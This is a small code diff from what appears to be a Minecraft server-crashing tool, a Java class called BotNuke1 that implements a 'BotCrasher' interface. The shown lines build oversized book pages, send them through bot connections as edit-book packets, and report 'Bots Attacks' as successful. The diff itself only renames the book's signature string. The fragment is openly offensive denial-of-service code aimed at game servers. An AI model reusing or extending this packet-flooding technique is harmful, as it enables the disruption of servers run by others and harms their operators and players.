@@ -34,7 +34,7 @@ public class BotNuke1 implements BotCrasher {
                 pages.add(content.repeat(size));
             }
 
-            botsRep.sendPacket(new ServerboundEditBookPacket(-1, pages, "xynis"), true);
+            botsRep.sendPacket(new ServerboundEditBookPacket(-1, pages, "redsignal"), true);
         }
 
         msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
